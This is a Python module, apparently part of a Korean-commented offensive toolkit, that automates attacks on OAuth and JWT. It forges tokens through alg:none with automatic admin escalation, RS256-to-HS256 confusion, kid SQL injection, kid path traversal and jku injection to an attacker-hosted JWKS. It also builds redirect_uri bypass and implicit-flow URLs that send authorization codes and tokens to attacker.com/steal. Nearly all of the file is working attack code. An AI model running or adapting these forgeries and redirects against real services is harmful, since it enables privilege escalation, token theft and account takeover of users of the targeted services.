"""bingo/tools/oauth_attacker.py — OAuth / JWT 자동 공격 체인 (v2.9.0)

기능:
  - JWT alg:none → 서명 없이 관리자 토큰 위조
  - RS256 → HS256 알고리즘 혼동 공격
  - redirect_uri 조작 → 인증 코드 탈취
  - state 파라미터 CSRF 취약점
  - refresh_token 무한 재사용 탐지
  - OAuth 암시적 흐름 토큰 탈취
  - JWT kid 파라미터 주입 (SQL/Path traversal)
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class OauthFinding:
    url: str
    attack_type: str
    description: str
    forged_token: str = ""
    stolen_code: str = ""
    severity: str = "CRITICAL"


@dataclass
class OauthReport:
    target: str
    findings: list[OauthFinding] = field(default_factory=list)
    access_tokens: list[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [f"[OAUTH/JWT] {self.target} | {len(self.findings)}개 발견"]
        for f in self.findings:
            lines.append(f"  [{f.attack_type:25}] {f.description[:60]}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# JWT 공격 도구
# ══════════════════════════════════════════════════════════════════════════════

def _b64_decode_pad(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "==")


def _b64_encode_nopad(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


class JwtAttackSuite:
    """JWT 공격 모음"""

    @staticmethod
    def decode(token: str) -> tuple[dict, dict, str]:
        parts = token.split(".")
        if len(parts) != 3:
            return {}, {}, ""
        try:
            header = json.loads(_b64_decode_pad(parts[0]))
            payload = json.loads(_b64_decode_pad(parts[1]))
            return header, payload, parts[2]
        except Exception:
            return {}, {}, ""

    @staticmethod
    def forge_none_alg(token: str, admin_claims: dict | None = None) -> str:
        """alg:none 공격 — 무서명 관리자 토큰 생성"""
        header, payload, _ = JwtAttackSuite.decode(token)
        if not header:
            return token
        header["alg"] = "none"
        if admin_claims:
            payload.update(admin_claims)
        else:
            # 자동으로 관리자 권한 부여
            for k, v in list(payload.items()):
                if k in ("role", "roles"):
                    payload[k] = "admin" if isinstance(v, str) else ["admin"]
                elif k in ("admin", "isAdmin", "is_admin"):
                    payload[k] = True
                elif k in ("type", "userType", "user_type"):
                    payload[k] = "admin"
        h = _b64_encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        p = _b64_encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}."

    @staticmethod
    def forge_rs256_to_hs256(token: str, public_key_pem: bytes) -> str:
        """RS256 → HS256 알고리즘 혼동 공격"""
        header, payload, _ = JwtAttackSuite.decode(token)
        if not header:
            return token
        header["alg"] = "HS256"
        h = _b64_encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        p = _b64_encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        message = f"{h}.{p}".encode()
        sig = hmac.new(public_key_pem, message, hashlib.sha256).digest()
        return f"{h}.{p}.{_b64_encode_nopad(sig)}"

    @staticmethod
    def forge_kid_sqli(token: str, sqli: str = "' UNION SELECT 'hacked'--") -> str:
        """kid 파라미터 SQL 인젝션"""
        header, payload, _ = JwtAttackSuite.decode(token)
        if not header:
            return token
        header["kid"] = sqli
        # HS256으로 서명 (키 = 'hacked')
        header["alg"] = "HS256"
        h = _b64_encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        p = _b64_encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        message = f"{h}.{p}".encode()
        sig = hmac.new(b"hacked", message, hashlib.sha256).digest()
        return f"{h}.{p}.{_b64_encode_nopad(sig)}"

    @staticmethod
    def forge_kid_path_traversal(token: str, path: str = "../../../dev/null") -> str:
        """kid 경로 탐색 → 빈 키로 서명"""
        header, payload, _ = JwtAttackSuite.decode(token)
        if not header:
            return token
        header["kid"] = path
        header["alg"] = "HS256"
        h = _b64_encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        p = _b64_encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        message = f"{h}.{p}".encode()
        sig = hmac.new(b"", message, hashlib.sha256).digest()  # 빈 키
        return f"{h}.{p}.{_b64_encode_nopad(sig)}"

    @staticmethod
    def forge_jwks_injection(token: str, exfil_url: str) -> tuple[str, str]:
        """jku/x5u 헤더 주입 — 공격자 JWKS로 검증"""
        header, payload, _ = JwtAttackSuite.decode(token)
        if not header:
            return token, ""
        header["jku"] = f"{exfil_url}/jwks.json"
        header.pop("x5u", None)
        header["alg"] = "RS256"
        h = _b64_encode_nopad(json.dumps(header, separators=(",", ":")).encode())
        p = _b64_encode_nopad(json.dumps(payload, separators=(",", ":")).encode())
        note = f"외부 서버 {exfil_url}/jwks.json 에 RS256 공개키 JWKS 배포 필요"
        return f"{h}.{p}.", note


# ══════════════════════════════════════════════════════════════════════════════
# OAuth 흐름 공격
# ══════════════════════════════════════════════════════════════════════════════

class OauthFlowAttacker:
    """OAuth 2.0 흐름 취약점 공격"""

    REDIRECT_URI_BYPASSES = [
        "https://attacker.com",
        "https://attacker.com/callback",
        "https://victim.com@attacker.com",
        "https://attacker.com%2Fcallback",
        "https://attacker.com%23",
        "//attacker.com",
        "https://attacker.com/../../victim.com",
    ]

    @staticmethod
    def find_oauth_endpoints(html: str, base_url: str) -> dict[str, str]:
        """OAuth 관련 URL 자동 추출"""
        endpoints = {}
        patterns = {
            "authorize": r'(https?://[^\s"\']+/oauth[^\s"\']*authorize[^\s"\']*)',
            "token": r'(https?://[^\s"\']+/oauth[^\s"\']*token[^\s"\']*)',
            "logout": r'(https?://[^\s"\']+/(?:logout|signout)[^\s"\']*)',
        }
        for name, pat in patterns.items():
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                endpoints[name] = m.group(1)
        return endpoints

    @staticmethod
    def redirect_uri_bypass(auth_url: str) -> list[str]:
        """redirect_uri 변조 URL 목록"""
        parsed = urllib.parse.urlparse(auth_url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        results = []
        for bypass in OauthFlowAttacker.REDIRECT_URI_BYPASSES:
            params["redirect_uri"] = bypass
            new_query = urllib.parse.urlencode(params)
            results.append(urllib.parse.urlunparse(parsed._replace(query=new_query)))
        return results

    @staticmethod
    def state_csrf_test(auth_url: str) -> tuple[str, str]:
        """state 파라미터 없거나 고정인지 확인"""
        parsed = urllib.parse.urlparse(auth_url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "state" not in params:
            return "MISSING_STATE", "state 파라미터 없음 → CSRF 취약"
        if len(params["state"]) < 8:
            return "WEAK_STATE", f"state 너무 짧음: {params['state']}"
        return "OK", "state 파라미터 정상"

    @staticmethod
    def implicit_flow_token_steal(auth_url: str) -> str:
        """암시적 흐름 토큰 탈취 URL"""
        parsed = urllib.parse.urlparse(auth_url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params["response_type"] = "token"
        params["redirect_uri"] = "https://attacker.com/steal"
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params)))


# ══════════════════════════════════════════════════════════════════════════════
# refresh_token 공격
# ══════════════════════════════════════════════════════════════════════════════

class RefreshTokenAttacker:
    """refresh_token 무한 재사용 / 탈취 테스트"""

    @staticmethod
    def test_refresh_reuse(
        token_url: str, refresh_token: str, request_fn: Callable
    ) -> dict:
        """동일 refresh_token 여러 번 사용 시도"""
        results = []
        for _ in range(3):
            body = f"grant_type=refresh_token&refresh_token={urllib.parse.quote(refresh_token)}"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            status, resp_body = request_fn(token_url, "POST", headers, body)
            try:
                data = json.loads(resp_body)
                results.append({"status": status, "new_token": data.get("access_token", "")})
            except Exception:
                results.append({"status": status, "error": resp_body[:100]})
        # 모두 성공하면 무한 재사용 취약
        all_success = all(r.get("new_token") for r in results)
        return {
            "vulnerable": all_success,
            "description": "refresh_token 무한 재사용 가능" if all_success else "정상",
            "attempts": results,
        }


# ══════════════════════════════════════════════════════════════════════════════
# 메인 OAuth 공격 엔진
# ══════════════════════════════════════════════════════════════════════════════

class OauthAttacker:
    """OAuth/JWT 자동 공격 엔진"""

    def __init__(self, request_fn: Callable[[str, str, dict, str], tuple[int, str]]) -> None:
        self.req = request_fn

    def _find_jwt(self, body: str) -> str | None:
        m = re.search(r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*", body)
        return m.group(0) if m else None

    def attack_jwt_in_response(self, url: str) -> list[OauthFinding]:
        findings = []
        _, body = self.req(url, "GET", {}, "")
        token = self._find_jwt(body)
        if not token:
            return findings

        # alg:none
        forged_none = JwtAttackSuite.forge_none_alg(token)
        findings.append(OauthFinding(
            url=url, attack_type="jwt_alg_none",
            description="alg:none 위조 토큰 생성",
            forged_token=forged_none,
        ))

        # kid 인젝션
        forged_kid = JwtAttackSuite.forge_kid_sqli(token)
        findings.append(OauthFinding(
            url=url, attack_type="jwt_kid_sqli",
            description="kid 파라미터 SQL 인젝션",
            forged_token=forged_kid,
        ))

        # kid 경로 탐색
        forged_pt = JwtAttackSuite.forge_kid_path_traversal(token)
        findings.append(OauthFinding(
            url=url, attack_type="jwt_kid_traversal",
            description="kid 경로 탐색 → 빈 키 서명",
            forged_token=forged_pt,
        ))

        return findings

    def attack_oauth_flow(self, base_url: str) -> list[OauthFinding]:
        findings = []
        _, html = self.req(base_url, "GET", {}, "")
        endpoints = OauthFlowAttacker.find_oauth_endpoints(html, base_url)

        if "authorize" in endpoints:
            auth_url = endpoints["authorize"]
            # state CSRF 테스트
            state_result, desc = OauthFlowAttacker.state_csrf_test(auth_url)
            if state_result != "OK":
                findings.append(OauthFinding(
                    url=auth_url, attack_type="oauth_state_csrf",
                    description=desc,
                ))
            # redirect_uri 우회
            bypass_urls = OauthFlowAttacker.redirect_uri_bypass(auth_url)
            for bu in bypass_urls[:3]:
                status, body = self.req(bu, "GET", {}, "")
                if status in (200, 302) and "attacker.com" in body:
                    findings.append(OauthFinding(
                        url=bu, attack_type="oauth_redirect_uri",
                        description=f"redirect_uri 우회 성공: {bu}",
                        severity="CRITICAL",
                    ))
        return findings

    def auto_scan(self, url: str) -> OauthReport:
        report = OauthReport(target=url)
        report.findings.extend(self.attack_jwt_in_response(url))
        report.findings.extend(self.attack_oauth_flow(url))
        return report
